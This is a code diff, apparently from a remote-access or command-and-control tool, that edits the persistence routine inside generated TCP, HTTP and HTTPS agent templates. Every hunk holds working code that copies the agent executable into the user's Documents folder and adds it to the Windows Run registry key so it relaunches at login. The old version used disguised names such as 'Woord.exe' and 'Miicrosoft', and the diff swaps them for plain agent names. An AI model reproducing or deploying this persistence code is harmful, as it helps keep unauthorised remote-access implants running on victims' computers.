@@ -2,12 +2,12 @@
 def tcp_agent_template(lhost, lport, persistence,agent_id):
     if persistence==True:
         val2= """def ensure_persistence():
-    destination_executable = os.path.join(os.environ['USERPROFILE'], 'Documents', "Woord.exe")
+    destination_executable = os.path.join(os.environ['USERPROFILE'], 'Documents', "TCPAGENT.exe")
     try:
         if not os.path.exists(destination_executable):
             shutil.copy(sys.executable, destination_executable)
             key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_SET_VALUE)
-            wreg.SetValueEx(key, "Miicrosoft", 0, wreg.REG_SZ, destination_executable)
+            wreg.SetValueEx(key, "TCPAGENT", 0, wreg.REG_SZ, destination_executable)
             wreg.CloseKey(key)
         #print("Persistence ensured.")
     except Exception as e:
@@ -168,11 +168,11 @@ def http_agent_template(lhost, lport, persistence, userAgent, sleepTimer,agent_i
         val1=f'''def ensure_persistence():
     try:
         documents_dir = os.path.join(os.environ['USERPROFILE'], 'Documents')
-        destination_executable = os.path.join(documents_dir, "client.exe")
+        destination_executable = os.path.join(documents_dir, "HTTPAGENT.exe")
         if not os.path.exists(destination_executable):
             shutil.copy(sys.executable, destination_executable)
             key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, wreg.KEY_SET_VALUE)
-            wreg.SetValueEx(key, "MyApp", 0, wreg.REG_SZ, destination_executable)
+            wreg.SetValueEx(key, "HTTPAGENT", 0, wreg.REG_SZ, destination_executable)
             wreg.CloseKey(key)
     except Exception as e:
         print(f"Error ensuring persistence: {{e}}")'''
@@ -336,11 +336,11 @@ def https_agent_template(lhost, lport, persistence, userAgent, sleepTimer,agent_
         val1=f'''def ensure_persistence():
     try:
         documents_dir = os.path.join(os.environ['USERPROFILE'], 'Documents')
-        destination_executable = os.path.join(documents_dir, "client.exe")
+        destination_executable = os.path.join(documents_dir, "HTTPSAGENT.exe")
         if not os.path.exists(destination_executable):
             shutil.copy(sys.executable, destination_executable)
             key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, wreg.KEY_SET_VALUE)
-            wreg.SetValueEx(key, "MyApp", 0, wreg.REG_SZ, destination_executable)
+            wreg.SetValueEx(key, "HTTPSAGENT", 0, wreg.REG_SZ, destination_executable)
             wreg.CloseKey(key)
     except Exception as e:
         print(f"Error ensuring persistence: {{e}}")'''
